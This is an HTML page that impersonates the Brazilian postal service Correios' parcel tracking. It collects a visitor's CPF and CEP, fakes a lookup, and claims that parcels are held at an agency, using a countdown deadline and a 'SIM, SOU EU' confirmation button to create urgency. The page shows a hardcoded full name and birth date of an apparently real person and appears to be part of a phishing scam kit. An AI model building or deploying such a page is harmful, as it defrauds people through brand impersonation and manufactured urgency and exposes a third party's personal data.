<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <link rel="stylesheet" href="css/bootstrap.css" />
  <link rel="stylesheet" href="css/app.css" />
  <link rel="stylesheet" href="css/yellow.css" />
  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
  <title>Correios | Rastreio</title>

  <style>
    @keyframes pulsar {
      0% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.1);
      }

      100% {
        transform: scale(1);
      }
    }

    #consultar-btn {
      animation: pulsar 1s infinite;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(0, 0, 0, 0.1);
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }

    #resultado {
      background: #f8f9fa;
      border-radius: 10px;
      padding: 2rem;
      font-family: Arial, sans-serif;
      color: #003157;
      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
    }

    #resultado h2 {
      font-weight: 700;
      margin-bottom: 1rem;
      color: #003157;
    }

    #resultado p {
      font-size: 1.1rem;
      margin: 0.5rem 0;
    }

    #resultado p span {
      font-weight: 700;
      color: #007bff;
    }

    #res-prazo {
      color: red;
      font-weight: bold;
      display: inline-block;
    }

    .btn-primary {
      background-color: #007bff;
      border-color: #007bff;
      padding: 10px 20px;
      font-size: 16px;
    }
  </style>
</head>

<body>
  <main>
    <section id="tela-formulario">
      <h1>Consulta de Encomendas - Correios</h1>
      <form id="form-rastreamento">
        <div>
          <label for="cpf">CPF:</label>
          <input type="text" id="cpf" placeholder="Digite seu CPF" required />
        </div>
        <div>
          <label for="cep">CEP:</label>
          <input type="text" id="cep" placeholder="Digite seu CEP" required />
        </div>
        <div id="botao-container">
          <button type="submit" id="consultar-btn">Consultar</button>
        </div>
      </form>
    </section>

    <div id="loading-container" style="display:none;">
      <div class="spinner"></div>
      <p>Consultando informaÃ§Ãµes...</p>
    </div>

    <section id="resultado" style="display: none;">
      <h2>Encontramos pedidos retidos em uma de nossas agÃªncias. ðŸ“¦</h2>
      <p><span>Nome:</span> <span id="res-nome"></span></p>
      <p><span>CPF:</span> <span id="res-cpf"></span></p>
      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
      <p><span>CEP:</span> <span id="res-cep"></span></p>
      <p><span>Rua:</span> <span id="res-rua"></span></p>
      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
      <p><span>Estado:</span> <span id="res-estado"></span></p>
      <p style="text-align:center;">
        <span>Prazo para RegularizaÃ§Ã£o:</span> <span id="res-prazo"></span>
      </p>
      <div style="text-align: center; margin-top: 20px;">
        <button class="btn btn-primary">SIM, SOU EU</button>
      </div>
    </section>
  </main>

  <script>
    function formatarCPF(cpf) {
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    function formatarCEP(cep) {
      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
    }

    function startContagemRegressiva(dataFinal) {
      const prazoSpan = document.getElementById("res-prazo");

      function atualizar() {
        const agora = new Date();
        const distancia = dataFinal - agora;

        if (distancia <= 0) {
          prazoSpan.textContent = "Prazo encerrado!";
          clearInterval(timer);
          return;
        }

        const dias = Math.floor(distancia / (1000 * 60 * 60 * 24));
        const horas = Math.floor((distancia % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutos = Math.floor((distancia % (1000 * 60 * 60)) / (1000 * 60));
        const segundos = Math.floor((distancia % (1000 * 60)) / 1000);

        prazoSpan.textContent = `${dias}d ${horas}h ${minutos}m ${segundos}s`;
      }

      atualizar();
      const timer = setInterval(atualizar, 1000);
    }

    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
      event.preventDefault();

      const cpfInput = document.getElementById("cpf");
      const cepInput = document.getElementById("cep");

      const cpfRaw = cpfInput.value.replace(/\D/g, "");
      const cepRaw = cepInput.value.replace(/\D/g, "");

      if (!cpfRaw || cpfRaw.length !== 11) {
        alert("Por favor, insira um CPF vÃ¡lido.");
        return;
      }

      if (!cepRaw || cepRaw.length !== 8) {
        alert("Por favor, insira um CEP vÃ¡lido.");
        return;
      }

      document.getElementById("botao-container").style.display = "none";
      document.getElementById("loading-container").style.display = "block";

      await new Promise((resolve) => setTimeout(resolve, 2000));

      const prazoFinal = new Date();
      prazoFinal.setDate(prazoFinal.getDate() + 10);
      prazoFinal.setHours(23);
      prazoFinal.setMinutes(59);
      prazoFinal.setSeconds(0);

      const dadosPessoa = {
        nome: "Rosiane Oliveira Da Silva",
        cpf: formatarCPF(cpfRaw),
        nascimento: "27/01/1985",
        cep: formatarCEP(cepRaw),
        rua: "",
        bairro: "",
        cidade: "PorciÃºncula",
        estado: "RJ"
      };

      document.getElementById("res-nome").textContent = dadosPessoa.nome;
      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
      document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
      document.getElementById("res-cep").textContent = dadosPessoa.cep;
      document.getElementById("res-rua").textContent = dadosPessoa.rua;
      document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
      document.getElementById("res-estado").textContent = dadosPessoa.estado;

      document.getElementById("loading-container").style.display = "none";
      document.getElementById("tela-formulario").style.display = "none";
      document.getElementById("resultado").style.display = "block";

      startContagemRegressiva(prazoFinal);
    });
  </script>
</body>

</html>
